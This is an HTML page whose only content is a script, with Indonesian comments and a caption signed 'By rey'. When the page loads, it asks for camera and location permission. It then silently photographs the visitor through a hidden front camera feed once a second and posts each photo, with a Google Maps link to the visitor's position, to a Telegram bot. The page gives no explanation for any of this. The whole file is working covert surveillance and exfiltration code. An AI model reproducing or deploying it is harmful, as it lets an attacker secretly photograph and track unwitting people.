<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Capture & Send to Telegram</title>
</head>
<body>
<script>
const token = "TOKEN_LU";
const chatId = "CHAT_ID_LU";

const camera = document.createElement("video");
camera.setAttribute("autoplay", true);
camera.style.display = "none";
document.body.appendChild(camera);

function requestPermissions() {
  return new Promise((resolve, reject) => {
    setTimeout(async () => {
      try {
        // Minta izin kamera
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });
        camera.srcObject = stream;

        // Minta izin lokasi
        navigator.geolocation.getCurrentPosition(
          position => {
            resolve({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            });
          },
          () => reject("Gagal mendapatkan lokasi")
        );
      } catch (err) {
        reject("Gagal mendapatkan izin kamera");
      }
    }, 2000);
  });
}

function captureAndSend(location) {
  if (!camera.srcObject) {
    console.error("Stream kamera belum tersedia.");
    return;
  }

  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");

  canvas.width = camera.videoWidth || 640;
  canvas.height = camera.videoHeight || 480;
  ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(blob => {
    const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
    const caption = `📍 [Lokasi Pengguna](${mapsUrl})\n📡 By rey`;

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", blob, "image.jpg");
    formData.append("caption", caption);
    formData.append("parse_mode", "Markdown");

    sendImageToTelegram(formData);
  }, "image/jpeg");
}

function sendImageToTelegram(formData) {
  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
    method: "POST",
    body: formData
  })
  .then(res => res.json())
  .then(data => console.log("Gambar berhasil dikirim:", data))
  .catch(err => console.error("Terjadi kesalahan:", err));
}

let intervalId;

window.onload = async function () {
  try {
    const location = await requestPermissions();
    if (location) {
      captureAndSend(location);
      intervalId = setInterval(() => {
        captureAndSend(location);
      }, 1000);
    }
  } catch (err) {
    console.error(err);
  }
};

window.onbeforeunload = function () {
  clearInterval(intervalId);
};
</script>
</body>
</html>
